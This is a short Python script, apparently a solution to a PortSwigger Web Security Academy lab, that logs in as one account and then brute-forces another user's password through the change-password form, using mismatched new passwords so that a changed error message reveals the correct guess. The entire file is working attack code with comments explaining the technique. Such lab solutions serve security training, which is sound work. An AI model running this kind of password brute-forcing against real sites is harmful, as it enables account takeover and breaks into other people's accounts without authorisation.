import requests
import time
import random

# Need to create a logged in session using the Session class
# If we attempt at changing the password directly here, it doesn't work and logs you out directly
# So, we use different new passwords, and thus when the password is correct the difference will be flagged instead of the incorrect current password

url = "https://0a63009803772a22805ce90c0008005c.web-security-academy.net/my-account/change-password"

session = requests.Session()

passwords = open("passwords.txt", "r").readlines()

sesh = session.post(url="https://0a63009803772a22805ce90c0008005c.web-security-academy.net/login",
data = {
    "username" : "wiener",
    "password" : "peter"
})



for password in passwords:

    data = {
        "username" : "carlos",
        "current-password" : password.strip(),
        "new-password-1" : "123456",
        "new-password-2" : "12345"
    }

    response = session.post(url, data=data)

    if(not b"Current password is incorrect" in response.content):
        print(f"DONE !! ===> Password : {password.strip()}")
        break